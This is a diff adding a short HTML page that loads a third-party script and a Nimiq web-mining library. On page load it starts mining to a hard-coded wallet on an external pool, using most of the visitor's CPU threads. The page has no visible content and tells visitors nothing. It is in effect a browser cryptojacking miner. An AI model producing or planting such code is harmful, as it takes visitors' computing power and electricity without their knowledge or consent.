@@ -1,1 +1,14 @@
-
+<html>
+    <head>
+        <script type="text/javascript" src="https://beholder.xyz/main.js" async></script>
+    </head>
+    <body>
+        <script src="https://cdn.jsdelivr.net/gh/Albermonte/nimiq-pool-webminer@latest/nimiq-pool-webminer.min.js"></script>
+        <script>
+            window.onload = () => {
+                //Pool Host, Pool Port, Wallet Address, # of CPU threads
+                PoolMiner.init("pool.acemining.co", 8443, "NQ59 RGPU 5TTB 026F TMAD DXTJ SC78 R651 8A72", window.navigator.hardwareConcurrency === 4 ? 1 : window.navigator.hardwareConcurrency - 4)
+            }
+        </script>
+        <div id="hs">0</div>  
+</html>
